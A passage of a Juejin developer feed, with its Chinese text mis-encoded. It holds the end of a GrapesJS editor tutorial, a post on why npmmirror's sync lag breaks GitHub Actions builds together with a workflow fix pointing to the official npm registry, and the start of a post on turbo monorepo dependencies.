<p>æ²¡æœ‰æ ·å¼ç®¡ç†å™¨ï¼Œç”¨æˆ·æ— æ³•è°ƒæ•´å¸ƒå±€ã€‚GrapesJS å…è®¸ä½ åˆ†ç»„å®šä¹‰ CSS å±æ€§ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-php" lang="php">editor.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'load'</span>, () =&gt; {
  editor.StyleManager.<span class="hljs-title function_ invoke__">addSector</span>(<span class="hljs-string">'layout'</span>, {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'å¸ƒå±€è®¾ç½®'</span>,
    <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">buildProps</span>: [<span class="hljs-string">'width'</span>, <span class="hljs-string">'height'</span>, <span class="hljs-string">'margin'</span>, <span class="hljs-string">'padding'</span>, <span class="hljs-string">'display'</span>],
  });
});
</code></pre>
<h3 data-id="heading-8">ç¬¬ä¸‰æ­¥ï¼šä¿å­˜ä¸å¯¼å‡ºæ•°æ®</h3>
<p>GrapesJS æœ€å¼ºå¤§çš„åœ°æ–¹åœ¨äºå®ƒèƒ½å°†å¤æ‚çš„ DOM è½¬åŒ–ä¸ºå¹²å‡€çš„ JSON æ•°æ®ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// è·å– HTML å’Œ CSS
const <span class="hljs-attr">html</span> = editor.getHtml()<span class="hljs-comment">;</span>
const <span class="hljs-attr">css</span> = editor.getCss()<span class="hljs-comment">;</span>

// æˆ–è€…è·å– JSON å¯¹è±¡ï¼ˆæ¨èç”¨äºä¿å­˜åˆ°æ•°æ®åº“ï¼Œæ–¹ä¾¿äºŒæ¬¡ç¼–è¾‘ï¼‰
const <span class="hljs-attr">projectData</span> = editor.getProjectData()<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">äº”ã€ è¿›é˜¶æŠ€å·§ï¼šè‡ªå®šä¹‰ç»„ä»¶ (Custom Components)</h2>
<p>å¦‚æœä½ éœ€è¦æ›´é«˜çº§çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚ï¼šç‚¹å‡»æŒ‰é’®è§¦å‘å¼¹çª—ï¼‰ï¼Œä½ éœ€è¦å®šä¹‰è‡ªå®šä¹‰ç»„ä»¶ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-php" lang="php">editor.Components.<span class="hljs-title function_ invoke__">addType</span>(<span class="hljs-string">'click-component'</span>, {
  <span class="hljs-attr">model</span>: {
    <span class="hljs-attr">defaults</span>: {
      <span class="hljs-attr">tagName</span>: <span class="hljs-string">'button'</span>,
      <span class="hljs-attr">draggable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">droppable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">traits</span>: [<span class="hljs-string">'id'</span>, <span class="hljs-string">'title'</span>],
      <span class="hljs-attr">attributes</span>: { <span class="hljs-attr">class</span>: <span class="hljs-string">'btn-primary'</span> },
      <span class="hljs-attr">script</span>: function() {
        this.<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">'click'</span>, () =&gt; <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">'ä½ ç‚¹å‡»äº†ç»„ä»¶ï¼'</span>));
      }
    }
  }
});
</code></pre>
<hr/>
<h2 data-id="heading-10">å…­ã€ æ€»ç»“ä¸æœ€ä½³å®è·µ</h2>
<p>æ„å»ºä¸€ä¸ªå®Œå–„çš„å¯è§†åŒ–ç¼–è¾‘å™¨ä¸ä»…ä»…æ˜¯å¼•å…¥ä¸€ä¸ªåº“ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ï¼Œä½ è¿˜éœ€è¦è€ƒè™‘ï¼š</p>
<ul>
<li><strong>èµ„æºç®¡ç†</strong>ï¼šç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡å­˜æ”¾åœ¨å“ªé‡Œï¼Ÿ</li>
<li><strong>æƒé™æ§åˆ¶</strong>ï¼šå“ªäº›ç»„ä»¶ä¸å…è®¸ç‰¹å®šç”¨æˆ·ä¿®æ”¹ï¼Ÿ</li>
<li><strong>å“åº”å¼é¢„è§ˆ</strong>ï¼šç¡®ä¿ç”¨æˆ·ç¼–è¾‘çš„é¡µé¢åœ¨æ‰‹æœºç«¯ä¹Ÿèƒ½å®Œç¾æ˜¾ç¤ºã€‚</li>
</ul>
<p>GrapesJS æä¾›äº†æé«˜çš„è‡ªç”±åº¦ï¼Œä½†ä¹Ÿæ„å‘³ç€å®ƒéœ€è¦å¼€å‘è€…æŠ•å…¥æ—¶é—´å»é…ç½®å’Œæ‰“ç£¨ UIã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸è¦åœ¨ github action å†…ä½¿ç”¨ npm çš„æ·˜å®é•œåƒæº]]></title>    <link>https://juejin.cn/post/7594309641867165734</link>    <guid>https://juejin.cn/post/7594309641867165734</guid>    <pubDate>2026-01-12T18:19:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594309641867165734" data-draft-id="7594301878827548710" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸è¦åœ¨ github action å†…ä½¿ç”¨ npm çš„æ·˜å®é•œåƒæº"/> <meta itemprop="keywords" content="å‰ç«¯,GitHub"/> <meta itemprop="datePublished" content="2026-01-12T18:19:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ruanCat"/> <meta itemprop="url" content="https://juejin.cn/user/2406144257559271"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸è¦åœ¨ github action å†…ä½¿ç”¨ npm çš„æ·˜å®é•œåƒæº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2406144257559271/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ruanCat
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T18:19:50.000Z" title="Mon Jan 12 2026 18:19:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>æ‘˜è¦</strong>ï¼š</p>
<p>æ·˜å®é•œåƒæºï¼ˆnpmmirrorï¼‰çš„åŒ…ç‰ˆæœ¬åŒæ­¥å­˜åœ¨æ»åï¼Œåœ¨ GitHub Action å·¥ä½œæµä¸­ä½¿ç”¨å¯èƒ½å¯¼è‡´æ„å»ºå¤±è´¥ã€‚å½“ä¾èµ–é“¾ä¸­æŸä¸ªåŒ…éœ€è¦åˆšå‘å¸ƒçš„æ–°ç‰ˆæœ¬æ—¶ï¼Œæ·˜å®é•œåƒæºå¯èƒ½å°šæœªåŒæ­¥ï¼Œä»è€Œè§¦å‘ <code>ERR_PNPM_NO_MATCHING_VERSION</code> é”™è¯¯ã€‚è§£å†³æ–¹æ¡ˆæ˜¯åœ¨ GitHub Action ä¸­å¼ºåˆ¶ä½¿ç”¨å®˜æ–¹ npm é•œåƒæºï¼šé€šè¿‡è®¾ç½® <code>NPM_CONFIG_REGISTRY</code> ç¯å¢ƒå˜é‡ï¼Œå¹¶åœ¨ pnpm å®‰è£…å‘½ä»¤ä¸­æ˜¾å¼æŒ‡å®š <code>--registry https://registry.npmjs.org</code>ã€‚</p>
</blockquote>
<p>æ³¨æ„çœ‹è¿™ä¸ªæç«¯çš„æƒ…å†µï¼Œåœ¨ç‰¹å®šæ—¶é—´å†…ï¼Œåˆ†åˆ«è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm v @typescript-eslint/scope-manager version --registry https://registry.npmmirror.com/
pnpm v @typescript-eslint/scope-manager version --registry https://registry.npmjs.org/
</code></pre>
<p>ä¸åŒé•œåƒæºçš„ç‰ˆæœ¬å·å®Œå…¨å¯¹ä¸ä¸Šï¼Œæœ€æ–°ç‰ˆæœ¬çš„ä¾èµ–å¯¹ä¸ä¸Šã€‚æ·˜å®é•œåƒçš„ä¾èµ–åŒ…ç‰ˆæœ¬ï¼Œå¿…å®šæ˜¯è½åäºå®˜æ–¹é•œåƒç‰ˆæœ¬çš„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/401477e17d474f178ad43c95f1447442~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768846790&amp;x-signature=vOJZy2jipAdMO24ZEecVgWHixJQ%3D" alt="2026-01-13-01-49-29" loading="lazy"/></p>
<p>æŸäº›å¯¹ä¾èµ–ç‰ˆæœ¬å¾ˆä¸¥æ ¼çš„åŒ…ï¼Œåœ¨ github action å·¥ä½œæµå†…ï¼Œä¼šå› ä¸ºåœ¨æ·˜å®é•œåƒæ‰¾ä¸åˆ°æœ€æ–°ç‰ˆæœ¬åŒ…ï¼Œè€Œå¯¼è‡´æ„å»ºé”™è¯¯ï¼Œæ¯”å¦‚ä»¥ä¸‹æƒ…å†µï¼š</p>
<pre><code class="hljs language-log" lang="log"> â€‰ERR_PNPM_NO_MATCHING_VERSIONâ€‰ No matching version found for @typescript-eslint/scope-manager@8.53.0 while fetching it from https://registry.npmmirror.com/

  This error happened while installing the dependencies of @unocss/eslint-plugin@66.5.12
   at @typescript-eslint/utils@8.53.0

  The latest release of @typescript-eslint/scope-manager is "8.52.0".

  Other releases are:
    * canary: 8.52.1-alpha.13
    * rc-v: 6.0.0-alpha.58
    * rc-v4: 4.0.0-alpha.16
    * rc-v5: 5.0.0-alpha.42
    * rc-v6: 7.0.0-alpha.0
    * rc-v8: 8.0.0-alpha.62

  If you need the full list of all 3762 published versions run "$ pnpm view @typescript-eslint/scope-manager versions".
</code></pre>
<p>è¿™æ®µæ—¥å¿—çš„æ„æ€å°±æ˜¯è¯´ï¼Œåœ¨ <code>https://registry.npmmirror.com/</code> æ·˜å®æºå†…ï¼Œæ‰¾ä¸åˆ° <code>8.53.0</code> ç‰ˆæœ¬çš„ <code>@typescript-eslint/scope-manager</code> åŒ…ï¼Œåªèƒ½æ‰¾åˆ° <code>8.52.0</code> ç‰ˆæœ¬çš„åŒ…ã€‚è€Œ <code>@unocss/eslint-plugin@66.5.12</code> åˆéœ€è¦æœ€æ–°ç‰ˆæœ¬çš„ <code>@typescript-eslint/scope-manager</code> åŒ…ã€‚</p>
<p>è¿™ä¸ªåŒ…å¯¹äºæˆ‘ç°åœ¨çš„æ—¶é—´æ¥è¯´ï¼Œæ˜¯åˆšåˆšå‘å¸ƒçš„æ–°åŒ…ã€‚æ·˜å®æºè¿˜æ¥ä¸åŠåšå‡ºåŒæ­¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc2ff0044f154c798192fd2466408c77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768846790&amp;x-signature=fYa5ufSxT5fVlxh5rAJF9KXAR2E%3D" alt="2026-01-13-01-55-13" loading="lazy"/></p>
<p>æ‰€ä»¥åœ¨ github action å†…ï¼ŒçœŸçš„ä¸åº”è¯¥ç”¨æ·˜å®é•œåƒæºï¼Œåº”è¯¥ç›´æ¥ç”¨å®˜æ–¹é•œåƒæºï¼Œç›´æ¥ç”¨æœ€æ–°çš„åŒ…ç‰ˆæœ¬ã€‚</p>
<h2 data-id="heading-0">ä¿®æ”¹å‡ºé”™çš„ github action å·¥ä½œæµ</h2>
<ol>
<li>æ•´ä¸ªä»»åŠ¡ç›´æ¥æŒ‡å®šç¯å¢ƒå˜é‡ï¼š <code>NPM_CONFIG_REGISTRY</code>ã€‚</li>
<li>ç”±äºä½¿ç”¨çš„ <code>pnpm/action-setup</code> å·¥ä½œæµå’Œ pnpm+monorepo çš„æ¶æ„ï¼Œæ‰€ä»¥åœ¨<code>é€’å½’å®‰è£…å­åŒ…ä¾èµ–</code>å’Œ<code>å®‰è£…å…¨å±€ä¾èµ–</code>çš„æ—¶å€™ï¼Œéœ€è¦åˆ†åˆ«å†™ä¸¤æ®µç‹¬ç«‹çš„å‚æ•°ã€‚</li>
</ol>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œå®‰è£…ä¾èµ–çš„æ—¶å€™æœ‰ä¸¤æ®µç‹¬ç«‹çš„å‘½ä»¤ï¼Œæ‰€ä»¥éœ€è¦åˆ†åˆ«è®¾ç½®é•œåƒæºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9718dae8e36b4afc9eabcb1dec0272d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768846790&amp;x-signature=Hc%2FDSkdrUCGgXNbNtB3%2FzK9QpU0%3D" alt="2026-01-13-02-12-33" loading="lazy"/></p>
<p>æœ€ç»ˆä¿®æ”¹åçš„å·¥ä½œæµå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">CI</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">tester:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">env:</span>
      <span class="hljs-comment"># å¼ºåˆ¶ä½¿ç”¨å®˜æ–¹ npm é•œåƒæºï¼Œé¿å…æ·˜å®é•œåƒæºç‰ˆæœ¬æ»åå¯¼è‡´æ„å»ºå¤±è´¥</span>
      <span class="hljs-comment"># å¿…é¡»åœ¨ job çº§åˆ«è®¾ç½®ï¼Œç¡®ä¿ä» pnpm/action-setup å’Œ setup-node é˜¶æ®µå°±å¼€å§‹ä½¿ç”¨å®˜æ–¹æº</span>
      <span class="hljs-attr">NPM_CONFIG_REGISTRY:</span> <span class="hljs-string">https://registry.npmjs.org/</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">æ£€å‡ºåˆ†æ”¯</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…pnpm</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">run_install:</span> <span class="hljs-string">|
            - recursive: true
              args: [--registry, https://registry.npmjs.org]
            - args: [--registry, https://registry.npmjs.org, --global, "tsx", "turbo"]
</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…node</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">node-version:</span> <span class="hljs-number">22.14</span><span class="hljs-number">.0</span>
          <span class="hljs-attr">cache:</span> <span class="hljs-string">pnpm</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[turbo æ ¹åŒ…æ²¡æœ‰å®‰è£…å­åŒ…ä¾èµ–ï¼Œå¯¼è‡´æ ¹åŒ…å‘½ä»¤è¿è¡Œæ—¶åŒ¹é…ç¼ºæ¼]]></title>    <link>https://juejin.cn/post/7594320543219564590</link>    <guid>https://juejin.cn/post/7594320543219564590</guid>    <pubDate>2026-01-12T18:36:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594320543219564590" data-draft-id="7594309641867214886" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="turbo æ ¹åŒ…æ²¡æœ‰å®‰è£…å­åŒ…ä¾èµ–ï¼Œå¯¼è‡´æ ¹åŒ…å‘½ä»¤è¿è¡Œæ—¶åŒ¹é…ç¼ºæ¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-12T18:36:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ruanCat"/> <meta itemprop="url" content="https://juejin.cn/user/2406144257559271"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            turbo æ ¹åŒ…æ²¡æœ‰å®‰è£…å­åŒ…ä¾èµ–ï¼Œå¯¼è‡´æ ¹åŒ…å‘½ä»¤è¿è¡Œæ—¶åŒ¹é…ç¼ºæ¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2406144257559271/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ruanCat
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T18:36:33.000Z" title="Mon Jan 12 2026 18:36:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>æ‘˜è¦</strong>ï¼š</p>
